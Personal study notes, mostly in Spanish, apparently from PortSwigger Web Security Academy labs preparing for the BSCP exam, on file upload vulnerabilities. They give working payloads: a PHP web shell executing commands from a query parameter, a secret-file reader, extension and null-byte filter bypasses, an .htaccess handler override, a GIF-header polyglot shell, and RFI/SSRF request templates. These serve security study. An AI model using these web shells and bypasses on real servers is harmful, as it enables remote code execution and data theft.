> Consejo: el **Content-type**: encabezado dentro de una solicitud HTTP de respuesta puede proporcionar pistas sobre que tipo de archivo cree el servidor que ha entregado. Si este encabezado no ha sido establecido explicitamente por el codigo de la aplicación, entonces normalmemente tendrá el estandar de extensiones archivo/tipo MIME, que es un estandar de archivos para mandar contenido a través de la red

### Ofuscar extensiones de archivos: 

Todos estos archivos exploit.php claramente son archivos que contienen el código `<?php echo file_get_contents('/home/carlos/secret'); ?>`

```
exploit.pHp
exploit.php.jpg
exploit.php.
exploit%2Ephp
exploit.php%00.jpg
exploit.asp;.jpg || exploit.asp%00.jpg
exploit.p.phphp
```

###  Remote File Inclusion `RFI` - Posible en el BSCP ⚠️⚠️⚠️

> RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be `HTTPS` and the file **extension** is checked, but the MIME content type or file content is maybe not validated. Incorrect RFI result in response message, `File must be either a jpg or png`.

> Methods to bypass extension validation:

1. Extension with varied capitalization, such as .`sVG`
2. Double extension, such as `.jpg.svg` or `.svg.jpg`
3. Extension with a delimiter, such as `%0a, %09, %0d, %00, #`. Other examples, `file.png%00.svg` or `file.png\x0d\x0a.svg`
4. Empty filename, `.svg`
5. Try to cut allowed extension with more than the maximum filename length.

> Below scenario could be exploited using [SSRF](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#ssrf---server-side-request-forgery) or RFI. Did not solve this challenge.....

```
POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=https://EXPLOIT.net/image.sVg
```

```
POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
```

![[Pasted image 20260810214846.png]]

---

1. En el perfil hay una opcion de cambiar el avatar la cual acepta archivos php, montamos un script rapido para leer el contenido del directorio:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
- Y visitamos la ruta donde se encuentran los avatares junto con el nombre del archivo (la ruta la podemos sacar haciendo hovering en la imagen en nuestro perfil):

![[Pasted image 20260801213059.png|379]]

https://0a5500f7035773cc824951dc00ce0028.web-security-academy.net/files/avatars/shell.php

- Tambien podriamos spawnear una shell y concatenarle en la query string el comando que queramos ejecutar:
![[Pasted image 20260801212946.png|257]]

```php
<?php 
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; 
?>
```

2. Mismo que el anterior pero era necesario cambiar el content type a uno permitido (como jpeg o png):
![[Pasted image 20260803200614.png|465]]
![[Pasted image 20260803200646.png|688]]

3. El directorio files/avatars no acepta codigo php, asi que hacemos path traversal a otra ruta y ahi probamos de nuevo ('/' URL encodeado es %2f):
![[Pasted image 20260803201332.png|255]]

4. Estaba bloqueada la extension .php, asi que creamos un '.htaccess' y en él indicamos que todos los archivos con extensión .bg3z queremos que nos los interprete como .php:

![[Pasted image 20260803202834.png|197]]
```.htaccess
AddType application/x-httpd-php .bg3z
```
![[Pasted image 20260803202932.png]]

5. Usamos un byte nulo para separar la extension veridica de la bait extension:
![[Pasted image 20260803203550.png|279]]

6. {POLYGOT: Tipo de archivo que es valido como uno o varios tipos de archivo}
	*  Para determinar el tipo de un archivo, los sistemas operativos suelen leer los primeros X bytes para determinarlo (https://en.wikipedia.org/wiki/List_of_file_signatures), entonces poniendo como primera linea la firma de un .gif, hacemos que para el SO, sea un gif pero se ejecute como un .php

```php
GIF8;
<?php 
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; 
?>
```
![[Pasted image 20260803204258.png]]